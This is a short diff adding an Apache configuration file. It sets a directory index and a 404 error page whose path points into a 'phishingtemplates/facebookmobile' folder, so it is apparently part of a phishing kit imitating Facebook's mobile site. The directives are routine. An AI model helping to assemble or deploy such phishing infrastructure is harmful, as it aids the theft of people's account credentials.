@@ -1,0 +1,5 @@
+# set errordocument
+ErrorDocument 404 /phishingtemplates/facebookmobile/errorhandler/404.php
+
+# set directory index
+DirectoryIndex index.php
